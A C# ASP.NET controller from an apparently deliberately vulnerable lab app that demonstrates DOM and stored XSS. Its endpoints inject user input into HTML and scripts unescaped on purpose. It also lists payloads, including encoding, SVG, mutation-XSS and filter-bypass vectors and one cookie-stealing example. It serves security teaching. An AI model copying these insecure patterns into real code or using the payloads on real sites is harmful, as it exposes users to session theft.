using InsecureAppWebNet8.Models;
using InsecureAppWebNet8.ViewModels;
using Microsoft.AspNetCore.Mvc;
using System.Text.Json;
using System.Text;

namespace InsecureAppWebNet8.Controllers
{
    public class XssDomController : Controller
    {
        private readonly Dictionary<string, AttackInfo> _attackInfos;

        // VULNÉRABLE : Commentaires stockés sans sanitisation
        private static readonly List<UserComment> _comments = new()
        {
            new UserComment { Id = 1, Author = "Admin", Content = "Bienvenue sur notre site!", CreatedAt = DateTime.Now.AddDays(-7) },
            new UserComment { Id = 2, Author = "User1", Content = "Super application!", CreatedAt = DateTime.Now.AddDays(-5) },
            new UserComment { Id = 3, Author = "Hacker<script>alert('XSS')</script>", Content = "<img src=x onerror=alert('Stored XSS')>", CreatedAt = DateTime.Now.AddDays(-2) }
        };

        // VULNÉRABLE : Messages privés
        private static readonly List<PrivateMessage> _messages = new()
        {
            new PrivateMessage { Id = 1, From = "Admin", To = "User1", Subject = "Welcome", Body = "Bienvenue sur la plateforme", CreatedAt = DateTime.Now.AddDays(-3) }
        };

        public XssDomController()
        {
            _attackInfos = new()
            {
                ["dom-innerHTML"] = new AttackInfo
                {
                    Description = "Injection via innerHTML permettant l'exécution de scripts.",
                    LearnMoreUrl = "https://owasp.org/www-community/attacks/DOM_Based_XSS",
                    RiskLevel = "High",
                    PayloadExample = "<img src=x onerror=alert('XSS')>",
                    ErrorExplanation = "innerHTML interprète le HTML et exécute les scripts."
                },
                ["dom-document-write"] = new AttackInfo
                {
                    Description = "Injection via document.write() sans échappement.",
                    LearnMoreUrl = "https://portswigger.net/web-security/cross-site-scripting/dom-based",
                    RiskLevel = "Critical",
                    PayloadExample = "<script>alert('XSS')</script>",
                    ErrorExplanation = "document.write() écrit directement dans le DOM."
                },
                ["dom-jquery-html"] = new AttackInfo
                {
                    Description = "Injection via jQuery .html() sans sanitisation.",
                    LearnMoreUrl = "https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html",
                    RiskLevel = "High",
                    PayloadExample = "<img src=x onerror='$.get(\"/api/steal?c=\"+document.cookie)'>",
                    ErrorExplanation = "jQuery .html() est équivalent à innerHTML."
                },
                ["dom-location-hash"] = new AttackInfo
                {
                    Description = "Injection via location.hash (fragment URL).",
                    LearnMoreUrl = "https://owasp.org/www-community/attacks/DOM_Based_XSS",
                    RiskLevel = "High",
                    PayloadExample = "#<img src=x onerror=alert('XSS')>",
                    ErrorExplanation = "Le hash de l'URL est injecté dans le DOM sans validation."
                },
                ["dom-eval"] = new AttackInfo
                {
                    Description = "Exécution de code via eval() avec entrée utilisateur.",
                    LearnMoreUrl = "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval",
                    RiskLevel = "Critical",
                    PayloadExample = "alert('XSS')",
                    ErrorExplanation = "eval() exécute directement le code JavaScript fourni."
                },
                ["dom-postMessage"] = new AttackInfo
                {
                    Description = "XSS via postMessage sans validation de l'origine.",
                    LearnMoreUrl = "https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage",
                    RiskLevel = "High",
                    PayloadExample = "{\"action\":\"exec\",\"code\":\"alert('XSS')\"}",
                    ErrorExplanation = "postMessage accepte des messages de n'importe quelle origine."
                },
                // NOUVEAUX TYPES D'ATTAQUES AVANCÉES
                ["dom-encoded-payloads"] = new AttackInfo
                {
                    Description = "Contournement de filtres via encodage (HTML entities, URL, Unicode, Base64).",
                    LearnMoreUrl = "https://portswigger.net/web-security/cross-site-scripting/contexts",
                    RiskLevel = "High",
                    PayloadExample = "&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;",
                    ErrorExplanation = "Les navigateurs décodent automatiquement les entités HTML."
                },
                ["dom-svg-payload"] = new AttackInfo
                {
                    Description = "XSS via balises SVG avec handlers d'événements.",
                    LearnMoreUrl = "https://portswigger.net/web-security/cross-site-scripting/contexts",
                    RiskLevel = "High",
                    PayloadExample = "<svg/onload=alert('XSS')>",
                    ErrorExplanation = "SVG supporte JavaScript via les attributs d'événements."
                },
                ["dom-data-uri"] = new AttackInfo
                {
                    Description = "XSS via Data URI avec contenu HTML/JavaScript malveillant.",
                    LearnMoreUrl = "https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URIs",
                    RiskLevel = "High",
                    PayloadExample = "data:text/html,<script>alert('XSS')</script>",
                    ErrorExplanation = "Data URI permet d'embarquer du contenu exécutable."
                },
                ["dom-mutation-xss"] = new AttackInfo
                {
                    Description = "Mutation XSS (mXSS) via double parsing et mutations DOM.",
                    LearnMoreUrl = "https://cure53.de/fp170.pdf",
                    RiskLevel = "Critical",
                    PayloadExample = "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
                    ErrorExplanation = "Le navigateur mute le DOM lors du double parsing, créant des XSS."
                }
            };
        }

        [HttpGet]
        public IActionResult Index()
        {
            var model = new VulnerabilityViewModel<XssDomResult>
            {
                AttackType = "",
                Payload = "",
                Results = new List<XssDomResult>(),
                AttackInfos = _attackInfos
            };

            // Passer les données au client de manière VULNÉRABLE
            ViewBag.CommentsJson = JsonSerializer.Serialize(_comments);
            ViewBag.UserData = GetUserData();

            return View(model);
        }

        [HttpPost]
        public IActionResult Index(string attackType, string payload)
        {
            payload = payload ?? string.Empty;

            var model = new VulnerabilityViewModel<XssDomResult>
            {
                AttackType = attackType,
                Payload = payload,
                Results = new List<XssDomResult>(),
                AttackInfos = _attackInfos
            };

            // VULNÉRABLE : Passer le payload directement à la vue
            ViewBag.CommentsJson = JsonSerializer.Serialize(_comments);
            ViewBag.UserData = GetUserData();
            ViewBag.UnsafePayload = payload; // VULNÉRABLE !

            if (!string.IsNullOrEmpty(attackType))
            {
                var result = new XssDomResult
                {
                    AttackType = attackType,
                    Success = true,
                    Message = "Payload injecté dans le DOM. Vérifiez la console et le DOM!",
                    InjectedPayload = payload
                };
                model.Results.Add(result);
            }

            return View(model);
        }

        // VULNÉRABLE : API qui retourne des données non sanitisées
        [HttpGet]
        public IActionResult GetComments()
        {
            return Json(new
            {
                success = true,
                comments = _comments,
                html = GenerateCommentsHtml() // VULNÉRABLE
            });
        }

        // VULNÉRABLE : Recherche sans échappement
        [HttpGet]
        public IActionResult Search(string q)
        {
            var results = _comments.Where(c =>
                c.Content.Contains(q ?? "", StringComparison.OrdinalIgnoreCase) ||
                c.Author.Contains(q ?? "", StringComparison.OrdinalIgnoreCase)
            ).ToList();

            return Json(new
            {
                success = true,
                query = q, // VULNÉRABLE : Retourné tel quel
                results = results,
                message = $"Found {results.Count} results for: {q}" // VULNÉRABLE
            });
        }

        // VULNÉRABLE : Ajout de commentaire
        [HttpPost]
        public IActionResult AddComment(string author, string content)
        {
            var comment = new UserComment
            {
                Id = _comments.Count + 1,
                Author = author ?? "Anonymous",
                Content = content ?? "", // VULNÉRABLE : Pas de sanitisation
                CreatedAt = DateTime.Now
            };

            _comments.Add(comment);

            return Json(new
            {
                success = true,
                comment = comment,
                html = $"<div class='comment'><strong>{comment.Author}</strong>: {comment.Content}</div>" // VULNÉRABLE
            });
        }

        // VULNÉRABLE : Profile update
        [HttpPost]
        public IActionResult UpdateProfile(string username, string bio, string website)
        {
            // VULNÉRABLE : Stockage direct sans validation
            var profile = new
            {
                username = username,
                bio = bio,
                website = website,
                avatar = $"<img src='/images/avatar/{username}.jpg' alt='{username}'>" // VULNÉRABLE
            };

            return Json(new
            {
                success = true,
                profile = profile,
                displayHtml = $@"
                    <div class='profile'>
                        {profile.avatar}
                        <h3>{username}</h3>
                        <p>{bio}</p>
                        <a href='{website}'>{website}</a>
                    </div>" // TOUT EST VULNÉRABLE
            });
        }

        // VULNÉRABLE : Message preview
        [HttpPost]
        public IActionResult PreviewMessage(string to, string subject, string body)
        {
            return Json(new
            {
                success = true,
                preview = new
                {
                    to = to,
                    subject = subject,
                    body = body,
                    html = $@"
                        <div class='message-preview'>
                            <div class='to'>To: {to}</div>
                            <div class='subject'>Subject: {subject}</div>
                            <div class='body'>{body}</div>
                        </div>" // VULNÉRABLE
                }
            });
        }

        // VULNÉRABLE : Template rendering
        [HttpPost]
        public IActionResult RenderTemplate(string template, string data)
        {
            // VULNÉRABLE : Template injection possible
            var rendered = template?.Replace("{{data}}", data) ?? "";

            return Json(new
            {
                success = true,
                rendered = rendered,
                script = $"document.getElementById('output').innerHTML = '{rendered}'" // VULNÉRABLE
            });
        }

        // NOUVEAUX ENDPOINTS VULNÉRABLES POUR PAYLOADS AVANCÉS

        // VULNÉRABLE : Décodage Base64 sans validation
        [HttpPost]
        public IActionResult DecodeBase64(string encodedData)
        {
            try
            {
                var decodedBytes = Convert.FromBase64String(encodedData ?? "");
                var decodedText = Encoding.UTF8.GetString(decodedBytes);

                return Json(new
                {
                    success = true,
                    original = encodedData,
                    decoded = decodedText,
                    html = $"<div class='decoded-content'>{decodedText}</div>" // VULNÉRABLE
                });
            }
            catch (Exception ex)
            {
                return Json(new
                {
                    success = false,
                    error = ex.Message,
                    html = $"<div class='error'>Erreur: {ex.Message}</div>" // VULNÉRABLE
                });
            }
        }

        // VULNÉRABLE : Traitement SVG sans sanitisation
        [HttpPost]
        public IActionResult ProcessSvg(string svgContent, string title)
        {
            var processedSvg = $@"
                <div class='svg-container' title='{title}'>
                    <h4>SVG Content:</h4>
                    {svgContent}
                </div>"; // ENTIÈREMENT VULNÉRABLE

            return Json(new
            {
                success = true,
                originalSvg = svgContent,
                processedHtml = processedSvg,
                preview = $"<iframe srcdoc='{processedSvg}' style='width:100%;height:200px;'></iframe>" // VULNÉRABLE
            });
        }

        // VULNÉRABLE : Data URI handler
        [HttpPost]
        public IActionResult ProcessDataUri(string dataUri, string description)
        {
            return Json(new
            {
                success = true,
                dataUri = dataUri,
                description = description,
                embedHtml = $@"
                    <div class='data-uri-content'>
                        <p>{description}</p>
                        <iframe src='{dataUri}' style='width:100%;height:150px;border:1px solid #ccc;'></iframe>
                    </div>", // VULNÉRABLE
                directLink = $"<a href='{dataUri}' target='_blank'>Ouvrir dans un nouvel onglet</a>" // VULNÉRABLE
            });
        }

        // VULNÉRABLE : Mutation XSS via parsing complexe
        [HttpPost]
        public IActionResult ProcessComplexHtml(string htmlContent, string wrapperTag = "div")
        {
            // VULNÉRABLE : Double parsing qui peut causer des mutations
            var wrappedContent = $"<{wrapperTag}>{htmlContent}</{wrapperTag}>";

            // Simuler un double parsing (très vulnérable aux mXSS)
            var tempDoc = new System.Xml.XmlDocument();
            try
            {
                tempDoc.LoadXml($"<root>{wrappedContent}</root>");
                var reparsed = tempDoc.InnerXml.Replace("<root>", "").Replace("</root>", "");

                return Json(new
                {
                    success = true,
                    original = htmlContent,
                    wrapped = wrappedContent,
                    reparsed = reparsed,
                    finalHtml = reparsed // VULNÉRABLE aux mutations
                });
            }
            catch
            {
                // Si le XML parsing échoue, retourner le contenu tel quel
                return Json(new
                {
                    success = true,
                    original = htmlContent,
                    wrapped = wrappedContent,
                    reparsed = wrappedContent,
                    finalHtml = wrappedContent // TOUJOURS VULNÉRABLE
                });
            }
        }

        // VULNÉRABLE : Endpoint pour les caractères Unicode
        [HttpPost]
        public IActionResult ProcessUnicode(string unicodeText, string encoding = "utf-8")
        {
            try
            {
                // VULNÉRABLE : Décodage direct sans validation
                var processedText = System.Net.WebUtility.HtmlDecode(unicodeText ?? "");
                var urlDecoded = System.Net.WebUtility.UrlDecode(unicodeText ?? "");

                return Json(new
                {
                    success = true,
                    original = unicodeText,
                    htmlDecoded = processedText,
                    urlDecoded = urlDecoded,
                    displayHtml = $@"
                        <div class='unicode-display'>
                            <h5>Original:</h5>
                            <code>{unicodeText}</code>
                            <h5>HTML Decoded:</h5>
                            <div class='decoded'>{processedText}</div>
                            <h5>URL Decoded:</h5>
                            <div class='decoded'>{urlDecoded}</div>
                        </div>" // TOUT EST VULNÉRABLE
                });
            }
            catch (Exception ex)
            {
                return Json(new
                {
                    success = false,
                    error = $"Erreur de décodage: {ex.Message}" // VULNÉRABLE
                });
            }
        }

        // VULNÉRABLE : Génération de JavaScript dynamique
        [HttpPost]
        public IActionResult GenerateScript(string functionName, string code, string parameters)
        {
            var generatedScript = $@"
                function {functionName}({parameters}) {{
                    {code}
                }}
                
                // Auto-execute
                {functionName}({parameters});
            "; // ENTIÈREMENT VULNÉRABLE

            return Json(new
            {
                success = true,
                functionName = functionName,
                script = generatedScript,
                executeHtml = $"<script>{generatedScript}</script>" // EXTRÊMEMENT VULNÉRABLE
            });
        }

        // VULNÉRABLE : Endpoint pour DOM Clobbering
        [HttpPost]
        public IActionResult TestDomClobbering(string elementId, string tagName, string attributes)
        {
            var element = $"<{tagName} id='{elementId}' {attributes}></{tagName}>";

            return Json(new
            {
                success = true,
                elementId = elementId,
                generatedHtml = element,
                testScript = $@"
                    // Test DOM Clobbering
                    document.getElementById('dom-test').innerHTML = '{element}';
                    console.log('Element created:', document.getElementById('{elementId}'));
                " // VULNÉRABLE
            });
        }

        // VULNÉRABLE : Template injection avancée
        [HttpPost]
        public IActionResult ProcessTemplate(string templateString, string[] variables, string[] values)
        {
            var processed = templateString;

            if (variables != null && values != null)
            {
                for (int i = 0; i < Math.Min(variables.Length, values.Length); i++)
                {
                    // VULNÉRABLE : Remplacement direct sans échappement
                    processed = processed?.Replace($"{{{{{variables[i]}}}}}", values[i]);
                }
            }

            return Json(new
            {
                success = true,
                original = templateString,
                processed = processed,
                renderHtml = $"<div class='template-result'>{processed}</div>", // VULNÉRABLE
                executeScript = $"document.getElementById('template-output').innerHTML = '{processed}';" // VULNÉRABLE
            });
        }

        // VULNÉRABLE : File upload simulation avec contenu dangereux
        [HttpPost]
        public IActionResult ProcessUpload(string filename, string content, string contentType)
        {
            var fileInfo = new
            {
                name = filename,
                type = contentType,
                content = content,
                preview = GenerateFilePreview(filename, content, contentType) // VULNÉRABLE
            };

            return Json(new
            {
                success = true,
                file = fileInfo,
                displayHtml = $@"
                    <div class='file-preview'>
                        <h5>Fichier: {filename}</h5>
                        <p>Type: {contentType}</p>
                        <div class='content'>{fileInfo.preview}</div>
                    </div>" // VULNÉRABLE
            });
        }

        // Helper methods
        private string GenerateCommentsHtml()
        {
            var html = "<div class='comments-list'>";
            foreach (var comment in _comments)
            {
                // VULNÉRABLE : Pas d'échappement HTML
                html += $@"
                    <div class='comment' data-id='{comment.Id}'>
                        <strong>{comment.Author}</strong>
                        <span class='date'>{comment.CreatedAt:yyyy-MM-dd}</span>
                        <p>{comment.Content}</p>
                    </div>";
            }
            html += "</div>";
            return html;
        }

        private string GenerateFilePreview(string filename, string content, string contentType)
        {
            // VULNÉRABLE : Génération de preview sans validation
            return contentType?.ToLower() switch
            {
                "text/html" => content, // TRÈS VULNÉRABLE
                "image/svg+xml" => content, // VULNÉRABLE
                "text/javascript" => $"<script>{content}</script>", // EXTRÊMEMENT VULNÉRABLE
                "application/json" => $"<pre>{content}</pre>", // VULNÉRABLE
                _ => $"<div class='file-content'>{content}</div>" // VULNÉRABLE
            };
        }

        private string GetUserData()
        {
            // VULNÉRABLE : Données utilisateur non échappées
            return JsonSerializer.Serialize(new
            {
                username = "TestUser<script>alert('XSS')</script>",
                role = "admin",
                preferences = new
                {
                    theme = "dark",
                    notifications = true,
                    signature = "<img src=x onerror=alert('User-XSS')>"
                },
                recentActivity = new[]
                {
                    "<script>console.log('Activity XSS')</script>",
                    "Login from <svg onload=alert('Activity')>",
                    "Data: <iframe src='javascript:alert(1)'></iframe>"
                }
            });
        }

        // Endpoint de test
        [HttpGet]
        public IActionResult TestEndpoints()
        {
            return Json(new
            {
                endpoints = new[]
                {
                    "GET /XssDom/GetComments - Commentaires non sanitisés",
                    "GET /XssDom/Search?q=<script> - Recherche vulnérable",
                    "POST /XssDom/AddComment - Ajout sans sanitisation",
                    "POST /XssDom/UpdateProfile - Profile HTML injection",
                    "POST /XssDom/PreviewMessage - Preview XSS",
                    "POST /XssDom/RenderTemplate - Template injection",
                    "POST /XssDom/DecodeBase64 - Base64 décodage vulnérable",
                    "POST /XssDom/ProcessSvg - SVG sans sanitisation",
                    "POST /XssDom/ProcessDataUri - Data URI dangereux",
                    "POST /XssDom/ProcessComplexHtml - mXSS via double parsing",
                    "POST /XssDom/ProcessUnicode - Unicode décodage vulnérable",
                    "POST /XssDom/GenerateScript - JavaScript dynamique",
                    "POST /XssDom/TestDomClobbering - DOM Clobbering",
                    "POST /XssDom/ProcessTemplate - Template injection avancée",
                    "POST /XssDom/ProcessUpload - Upload file vulnérable"
                },
                vulnerabilities = new[]
                {
                    "innerHTML without sanitization",
                    "document.write() with user input",
                    "jQuery .html() injection",
                    "location.hash injection",
                    "eval() with user data",
                    "postMessage without origin check",
                    "DOM manipulation without encoding",
                    "Base64 decoding without validation",
                    "SVG injection vectors",
                    "Data URI protocol abuse",
                    "Mutation XSS (mXSS) via double parsing",
                    "Unicode/HTML entity decoding",
                    "Dynamic JavaScript generation",
                    "Template injection",
                    "DOM Clobbering",
                    "File upload XSS",
                    "No Content-Security-Policy",
                    "No input validation",
                    "No output encoding"
                },
                encodingExamples = new[]
                {
                    "&#60;script&#62;alert(1)&#60;/script&#62; - HTML entities",
                    "%3Cscript%3Ealert(1)%3C/script%3E - URL encoding",
                    "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e - Unicode",
                    "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== - Base64",
                    "String.fromCharCode(60,115,99,114,105,112,116,62) - Character codes"
                },
                advancedPayloads = new[]
                {
                    "<svg/onload=alert('SVG')>",
                    "data:text/html,<script>alert('DataURI')</script>",
                    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
                    "<math><mtext><table><mglyph><style><!--</style><img title=\"--&gt;&lt;/mglyph&gt;&lt;img src=1 onerror=alert(1)&gt;\">",
                    "<template><script>alert(1)</script></template>",
                    "eval(atob('YWxlcnQoJ0Jhc2U2NCcp'))",
                    "alert`1`",
                    "top[/al/.source+/ert/.source](1)",
                    "${alert(1)}",
                    "javascript:alert('Protocol')",
                    "<form id=test><input id=attributes><input id=attributes>",
                    "<img name=body><object name=alert data=x:x>",
                    "<iframe srcdoc='<script>alert(parent.document.domain)</script>'>",
                    "<!--[if IE]><script>alert('IE')</script><![endif]-->",
                    "<details open ontoggle=alert('Details')>"
                }
            });
        }

        // VULNÉRABLE : Frame pour les tests postMessage
        [HttpGet]
        public IActionResult Frame()
        {
            var html = @"
<!DOCTYPE html>
<html>
<head>
    <title>Vulnerable Frame</title>
</head>
<body>
    <h3>Frame vulnérable pour postMessage</h3>
    <div id='frame-content'></div>
    <script>
        // VULNÉRABLE : Écoute tous les messages sans vérification
        window.addEventListener('message', function(e) {
            document.getElementById('frame-content').innerHTML = e.data.html || e.data;
        });
        
        // VULNÉRABLE : Envoie des données au parent
        window.parent.postMessage({
            type: 'frame-ready',
            data: '<img src=x onerror=alert(""Frame-XSS"")>'
        }, '*');
    </script>
</body>
</html>";

            return Content(html, "text/html");
        }
    }

    // Modèles
    public class XssDomResult
    {
        public string AttackType { get; set; } = string.Empty;
        public bool Success { get; set; }
        public string Message { get; set; } = string.Empty;
        public string InjectedPayload { get; set; } = string.Empty;
    }

    public class UserComment
    {
        public int Id { get; set; }
        public string Author { get; set; } = string.Empty;
        public string Content { get; set; } = string.Empty;
        public DateTime CreatedAt { get; set; }
    }

    public class PrivateMessage
    {
        public int Id { get; set; }
        public string From { get; set; } = string.Empty;
        public string To { get; set; } = string.Empty;
        public string Subject { get; set; } = string.Empty;
        public string Body { get; set; } = string.Empty;
        public DateTime CreatedAt { get; set; }
    }
}